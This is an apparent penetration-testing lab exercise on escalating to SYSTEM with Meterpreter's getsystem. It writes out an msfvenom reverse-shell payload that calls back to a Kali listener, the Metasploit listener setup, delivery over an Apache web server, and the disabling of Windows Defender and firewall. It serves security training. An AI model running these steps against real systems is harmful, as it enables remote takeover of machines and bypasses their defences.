# Meterpreter

## Escalate Privileges To SYSTEM Using Meterpreter’s Command GETSYSTEM
Gaining SYSTEM privileges on a Windows machine is essential for penetration testers and red teamers to perform advanced post-exploitation tasks like credential dumping and accessing sensitive data. Meterpreter's GETSYSTEM command is a powerful tool for escalating privileges to SYSTEM-level access.

#### Preparation
- Target machine: Windows 10 VM with local administrator privileges
- Attacker machine: Kali Linux VM with Metasploit installed

#### Tasks
- Use MSFVenom to generate a Meterpreter reverse shell payload. Ensure you set the payload to be compatible with the target machine's architecture
- Transfer the payload to the target machine
- Create a Meterpreter listener
- On the target machine, right-click the payload file and select "Run as administrator" to start the reverse shell with elevated privileges
- Within the Meterpreter session, use the `getsystem` command to escalate your privileges to SYSTEM level
- Execute either the `whoami` or `getuid` command

#### Solutions 
1. Get the IPv4 addresses of both VMs and ping each other to ensure network connectivity
2. In Kali Linux, create the reverse shell executable for windows using the following sample command
   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali_Linux_IP_address> LPORT=4444 -f exe -o /home/kali/Desktop/reverseshell.exe
   ```
3. Start the Metasploit framework using `msfconsole`
4. Set the payload using `set PAYLOAD windows/meterpreter/reverse_tcp`
5. Set the LHOST to the Kali Linux's IP address using `set LHOST <Kali_Linux_IP_address>`
6. Set the LPORT (listening port) to 4444 using `set LPORT 4444`
7. In a separate second terminal, send the file over to the target machine either using a web server or a shared folder in the VM. In this task, a web server is used
8. First, navigate to the Desktop directory in the terminal, and copy the reverse shell executable from the desktop to the web server directory at /var/www/html using the command `sudo cp reverseshell.exe /var/www/html`
9. Before starting the Apache web server, verify its status using `service apache2 status`. If it is currently disabled, run the command `service apache2 start` to activate the web server
10. Disable beforehand the Microsoft Firewall and Protection to prevent auto-deletion of the reverse shell executable once it is downloaded
11. In Windows 10 VM, open a web browser and enter the Kali Linux's IP address with the name of the executable as the following: `192.168.1.14/reverseshell.exe`
12. In Kali Linux VM, since the listening port was configured to port 4444, run the commmand `sudo ufw allow 4444/tcp` in the second terminal to allow incoming TCP traffic
13. In the Kali Linux terminal used for the Metasploit framework, run exploit using `exploit`
14. Back to Windows 10 VM, run the downloaded reverseshell.exe as administrator. This should open a Meterpreter session in Kali Linux
15. In Kali Linux, use the `getsystem` command to escalate the privileges to SYSTEM level
16. Enter `shell` and `whoami` to get `nt authority\system`

<br/>
Sample screenshot of a successful Meterpreter session is shown below: 

![image](https://github.com/user-attachments/assets/e61bc49c-66f1-4a0a-8025-539e6ed14d7d)

